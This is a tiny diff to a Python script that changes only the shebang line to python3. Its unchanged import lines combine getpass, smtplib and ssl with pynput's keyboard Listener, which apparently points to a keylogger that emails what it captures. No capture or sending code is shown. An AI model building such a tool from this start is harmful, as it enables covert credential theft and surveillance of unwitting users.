@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import getpass, smtplib, ssl
 from pynput.keyboard import Key, Listener
 #list of imports 
